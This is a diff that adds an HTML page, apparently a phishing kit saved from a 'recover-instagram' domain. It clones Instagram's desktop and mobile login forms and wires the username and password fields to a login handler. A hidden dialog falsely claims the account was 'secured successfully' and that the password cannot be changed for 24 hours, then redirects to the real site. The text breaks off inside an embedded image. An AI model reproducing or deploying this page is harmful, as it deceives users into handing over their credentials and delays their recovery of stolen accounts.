@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<!-- saved from url=(0034)https://recover-instagram.web.app/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
+
+    <link rel="stylesheet" href="style.css">
+    <script src="jquery.js"></script>
+
+    <!-- <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script> -->
+
+    <title>Instagram</title>
+</head>
+<body onload="setTimeout(() => init(), 1200)">
+    <div id="desktop">
+            <div class="main-space">
+                <div class="left-space">
+                    <img src="media/screenshot1.png">
+                </div>
+                <div class="right-space">
+                    <div class="login-form">
+                        <div class="logo"></div>
+                        <div class="form-area">
+                            <input type="text" class="uid" placeholder="Phone number, username or email address" oninput="toggleLoginBtn(0)">
+                            <input type="password" class="pwd" placeholder="Password" oninput="toggleLoginBtn(0)">
+                            <button class="login-btn" onclick="attemptLogin(0);" disabled=""><span>Log in</span>
+                                <div style="display: none;">
+                                    <svg aria-label="Loading..." class=" _abdw" viewBox="0 0 100 100"><rect fill="#fafafa" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.125" rx="5" ry="5" transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.625" rx="5" ry="5" transform="rotate(135 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.875" rx="5" ry="5" transform="rotate(225 50 50)" width="28" x="67" y="45"></rect></svg>
+                                </div>
+                            </button>
+                            <div class="or-seperator">
+                                <div class="line"></div>
+                                <span>or</span>
+                                <div class="line"></div>
+                            </div>
+                            <button class="fb-login" onclick="redirect('https:/' + '/www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522cftylu5tv5g71cdashr1vy9ns0r93zkw1tq36i9b6byu15xfp1l%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_GB%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3fe49588-af8c-4e07-9ef0-92bedc6aafca%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522cftylu5tv5g71cdashr1vy9ns0r93zkw1tq36i9b6byu15xfp1l%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0')">
+                                <span class="fb-logo"></span>
+                                <span class="fb-login-txt">Log in with Facebook</span>
+                            </button>
+                            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pwd">Forgotten your password?</a>
+                        </div>
+                    </div>
+                    <div class="signup-section">
+                        <div class="signup-txt">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
+                    </div>
+                    <div class="get-app">
+                        <span class="txt">Get the app.</span>
+                        <div class="download-links">
+                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D1266342A-28A1-41F7-8A65-DCA98D1FA1EA%26utm_content%3Dlo%26utm_medium%3Dbadge">
+                                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png">
+                            </a>
+                            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C29%2C1920%2C1051">
+                                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        
+        <div class="footer">
+            <ul>
+                <li><a href="https://recover-instagram.web.app/#">Meta</a></li>
+                <li><a href="https://recover-instagram.web.app/#">About</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Blog</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Jobs</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Help</a></li>
+                <li><a href="https://recover-instagram.web.app/#">API</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Privacy</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Terms</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Top Accounts</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Hashtags</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Locations</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Instagram Lite</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Contact uploading and non-users</a></li>
+            </ul>
+            <section>
+                English (UK)
+                         
+                © 2022 Instagram from Meta
+            </section>
+        </div>
+    </div>
+    <div id="phone">
+        
+        <div class="login-form" style="height: 760px;">
+            <div class="lang-section">
+                <div class="lang-widget">
+                        <span class="lang-label">English (UK)</span>
+                        <div class="dropdown">
+                            <span style="display: inline-block; transform: rotate(180deg) translate(0, 2px);">
+                                <svg color="#8e8e8e" fill="#8e8e8e" height="12" role="img" viewBox="0 0 24 24" width="12">
+                                    <path d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z"></path>
+                                </svg>
+                            </span>
+                        </div>
+                </div>
+            </div>
+
+            <div class="logo"></div>
+            <button class="fb-login" style="min-width: 200px; max-width: 268px;" onclick="redirect('https:/' + '/m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252211uxz5zpe0ww5cf1moc14u5tcy1clau27dw2bc6m7g2oh5keqd0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_GB%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9c2183b9-6f19-4e61-b71f-3c7563c7998a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252211uxz5zpe0ww5cf1moc14u5tcy1clau27dw2bc6m7g2oh5keqd0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')">
+                <span class="fb-logo"></span>
+                <span class="fb-login-txt">Continue Using Facebook</span>
+            </button>
+            <div class="or-seperator" style="max-width: 268px;">
+                <div class="line"></div>
+                <span>or</span>
+                <div class="line"></div>
+            </div>
+            <div class="form-area">
+                <input type="text" class="uid" placeholder="Phone number, username or email address" style="width: 100%;" oninput="toggleLoginBtn(1)">
+                <input type="password" class="pwd" placeholder="Password" style="width: 100%;" oninput="toggleLoginBtn(1)">                
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pwd" style="max-width: 268px;">Forgotten your password?</a>
+                <button class="login-btn" style="min-width: 200px; max-width: 268px; width: 100%;" onclick="attemptLogin(1);" disabled=""><span>Log in</span>
+                    <div style="display: none;">
+                        <svg aria-label="Loading..." class=" _abdw" viewBox="0 0 100 100"><rect fill="#fafafa" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.125" rx="5" ry="5" transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.625" rx="5" ry="5" transform="rotate(135 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.875" rx="5" ry="5" transform="rotate(225 50 50)" width="28" x="67" y="45"></rect></svg>
+                    </div>
+                </button>
+            </div>
+            <div class="signup-section" style="border: none;">
+                <div class="signup-txt" style="color: rgb(142, 142, 142);">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
+            </div>
+            <div class="meta-mark">
+
+            </div>
+        </div>
+        <div class="footer" style="padding: 20px; background-color: rgb(250, 250, 250);">
+            <ul>
+                <li><a href="https://recover-instagram.web.app/#">Meta</a></li>
+                <li><a href="https://recover-instagram.web.app/#">About</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Blog</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Jobs</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Help</a></li>
+                <li><a href="https://recover-instagram.web.app/#">API</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Privacy</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Terms</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Top Accounts</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Hashtags</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Locations</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Instagram Lite</a></li>
+                <li><a href="https://recover-instagram.web.app/#">Contact uploading and non-users</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <div id="dialog-shadow" style="display: none;">
+        <div id="dialog" class="hidden">
+            <div class="title">Account secured successfully</div>
+            <div class="txt">Instagram was successfully logged out from the unauthorised device. For security reasons, your password can't be changed for next 24 hours.</div>
+            
+            <button onclick="redirect('https:/' + '/www.instagram.com')">Continue to Log in</button>
+        </div>
+    </div>
+    
+    <div id="splash-screen-desktop" style="display: none;">
+        <img width="72px" src="data:image/png;base64,i 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">
+        <img class="meta-mark" src="data:image/png;base64,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